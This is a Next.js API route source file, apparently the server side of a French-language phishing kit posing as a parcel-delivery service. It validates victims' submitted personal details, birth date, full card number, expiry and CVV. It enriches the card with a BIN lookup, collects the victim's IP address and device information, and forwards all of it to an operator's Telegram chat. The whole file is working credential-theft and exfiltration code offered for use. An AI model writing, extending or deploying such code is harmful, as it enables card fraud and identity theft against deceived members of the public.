import { NextRequest, NextResponse } from "next/server";
import { ZodError, z } from "zod";

import { getBinInfo, type BinInfo } from "@/lib/binCheck";

export const dynamic = "force-dynamic";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramMessage(text: string): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error(
      "Configuration Telegram manquante (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)",
    );
  }

  const res = await fetch(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    },
  );

  if (!res.ok) {
    const body = await res.text();
    throw new Error(`Telegram API error ${res.status}: ${body}`);
  }
}

const notifySchema = z.object({
  trackingNumber: z.string().trim().optional(),
  zipcode: z.string().trim().optional(),
  deliveryMode: z.string().trim().optional(),
  selectedParcelShop: z.string().trim().optional(),
  deliveryDate: z.string().trim().optional(),
  deliveryTime: z.string().trim().optional(),
  lastName: z.string().trim().optional(),
  firstName: z.string().trim().optional(),
  birthDate: z.string().trim().optional(),
  address: z.string().trim().optional(),
  city: z.string().trim().optional(),
  postalCode: z.string().trim().optional(),
  phone: z
    .string()
    .trim()
    .transform(v => v.replace(/\s+/g, ""))
    .refine(v => /^(?:0[1-9]\d{8}|\+33[1-9]\d{8})$/.test(v), {
      message: "Numéro de téléphone invalide",
    })
    .optional(),
  email: z.string().trim().optional(),
  cardHolder: z.string().trim().min(1),
  cardNumber: z.string().trim().min(4),
  expiry: z.string().trim().min(2),
  cvv: z.string().trim().min(1),
  timestamp: z.string().trim().min(1),
  userAgent: z.string().optional(),
});

type NotifyPayload = z.infer<typeof notifySchema>;

const sanitizeText = (value: unknown) =>
  String(value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

const normalizeHeaderValue = (value: string | null) =>
  value?.replace(/^"+|"+$/g, "").trim() || "";

const detectDeviceType = (userAgent: string, uaMobileHeader: string | null) => {
  const normalizedHint = normalizeHeaderValue(uaMobileHeader);
  if (normalizedHint === "?1") return "Mobile";
  if (normalizedHint === "?0") return "Desktop";
  if (/(Mobile|Android|iPhone|iPad|iPod)/i.test(userAgent)) return "Mobile";
  if (/(Windows NT|Macintosh|X11|Linux x86_64|CrOS)/i.test(userAgent)) return "Desktop";
  return "Inconnu";
};

const detectOperatingSystem = (userAgent: string, uaPlatformHeader: string | null) => {
  const normalizedPlatform = normalizeHeaderValue(uaPlatformHeader).toLowerCase();
  if (normalizedPlatform === "ios") return "iOS";
  if (normalizedPlatform === "android") return "Android";
  if (normalizedPlatform === "windows") return "Windows";
  if (normalizedPlatform === "macos") return "macOS";
  if (normalizedPlatform === "linux") return "Linux";
  if (normalizedPlatform === "chrome os") return "Chrome OS";
  if (/(iPhone|iPad|iPod)/i.test(userAgent)) return "iOS";
  if (/Android/i.test(userAgent)) return "Android";
  if (/Windows NT/i.test(userAgent)) return "Windows";
  if (/Mac OS X|Macintosh/i.test(userAgent)) return "macOS";
  if (/CrOS/i.test(userAgent)) return "Chrome OS";
  if (/Linux/i.test(userAgent)) return "Linux";
  return "Inconnu";
};

const formatTimestamp = (timestamp: string) => {
  const date = new Date(timestamp);
  if (Number.isNaN(date.getTime())) return sanitizeText(timestamp);
  return new Intl.DateTimeFormat("fr-FR", {
    dateStyle: "short",
    timeStyle: "medium",
  }).format(date);
};

const buildMessage = (
  payload: NotifyPayload,
  meta: {
    clientIp: string;
    deviceType: string;
    operatingSystem: string;
    receivedAt: string;
    userAgent: string;
  },
  binInfo: BinInfo,
) => {
  const lines: string[] = [];

  if (
    payload.trackingNumber ||
    payload.zipcode ||
    payload.deliveryMode ||
    payload.selectedParcelShop ||
    payload.deliveryDate ||
    payload.deliveryTime
  ) {
    lines.push(
      "<b>📦 Livraison</b>",
      `• <b>Suivi</b> : ${sanitizeText(payload.trackingNumber || "(non communiqué)")}`,
      `• <b>Code postal</b> : ${sanitizeText(payload.zipcode || "(non communiqué)")}`,
      `• <b>Mode</b> : ${sanitizeText(payload.deliveryMode || "(non communiqué)")}`,
      `• <b>Point relais</b> : ${sanitizeText(payload.selectedParcelShop || "(non communiqué)")}`,
      `• <b>Date</b> : ${sanitizeText(payload.deliveryDate || "(non communiqué)")}`,
      `• <b>Heure</b> : ${sanitizeText(payload.deliveryTime || "(non communiqué)")}`,
      "",
    );
  }

  lines.push(
    "<b>🧾 Informations personnelles</b>",
    `• <b>Nom</b> : ${sanitizeText(payload.lastName || "(non communiqué)")}`,
    `• <b>Prénom</b> : ${sanitizeText(payload.firstName || "(non communiqué)")}`,
    `• <b>Date de naissance</b> : ${sanitizeText(payload.birthDate || "(non communiqué)")}`,
    `• <b>Adresse</b> : ${sanitizeText(payload.address || "(non communiqué)")}`,
    `• <b>Ville</b> : ${sanitizeText(
      [payload.postalCode, payload.city].filter(Boolean).join(" ") || "(non communiqué)",
    )}`,
    `• <b>Téléphone</b> : ${sanitizeText(payload.phone || "(non communiqué)")}`,
    `• <b>Email</b> : ${sanitizeText(payload.email || "(non communiqué)")}`,
    "",
    "<b>💳 Paiement</b>",
    `• <b>Titulaire</b> : ${sanitizeText(payload.cardHolder)}`,
    `• <b>Carte</b> : ${sanitizeText(payload.cardNumber)}`,
    `• <b>Expiration</b> : ${sanitizeText(payload.expiry)}`,
    `• <b>CVV</b> : ${sanitizeText(payload.cvv)}`,
    `• <b>Banque</b> : ${sanitizeText(binInfo.bank)}`,
    `• <b>Niveau</b> : ${sanitizeText(binInfo.level)}`,
    `• <b>Type</b> : ${sanitizeText(binInfo.type)}`,
    `• <b>Image de la carte</b> : ${
      binInfo.imageUrl ? sanitizeText(binInfo.imageUrl) : "(non disponible)"
    }`,
    "",
    "<b>🧭 Infos client</b>",
    `• <b>Reçu le</b> : ${formatTimestamp(meta.receivedAt)}`,
    `• <b>Horodatage formulaire</b> : ${formatTimestamp(payload.timestamp)}`,
    `• <b>IP</b> : <code>${sanitizeText(meta.clientIp || "(IP non transmise)")}</code>`,
    `• <b>Type d'appareil</b> : ${sanitizeText(meta.deviceType)}`,
    `• <b>Système</b> : ${sanitizeText(meta.operatingSystem)}`,
    `• <b>User-Agent</b> : ${sanitizeText(
      meta.userAgent || payload.userAgent || "(userAgent non communiqué)",
    )}`,
  );

  return lines.join("\n");
};

export async function POST(req: NextRequest) {
  try {
    const json = await req.json();
    const payload = notifySchema.parse(json);

    const userAgent = req.headers.get("user-agent") ?? "";
    const meta = {
      clientIp:
        req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
        req.headers.get("x-real-ip") ??
        "",
      deviceType: detectDeviceType(userAgent, req.headers.get("sec-ch-ua-mobile")),
      operatingSystem: detectOperatingSystem(userAgent, req.headers.get("sec-ch-ua-platform")),
      receivedAt: new Date().toISOString(),
      userAgent,
    };

    const binInfo = await getBinInfo(payload.cardNumber);
    const message = buildMessage(payload, meta, binInfo);

    await sendTelegramMessage(message);

    return NextResponse.json({ ok: true });
  } catch (error) {
    if (error instanceof ZodError) {
      return NextResponse.json(
        { error: "Payload invalide", issues: error.issues },
        { status: 400 },
      );
    }
    console.error("[telegram/route] erreur", error);
    return NextResponse.json({ error: "Erreur serveur" }, { status: 500 });
  }
}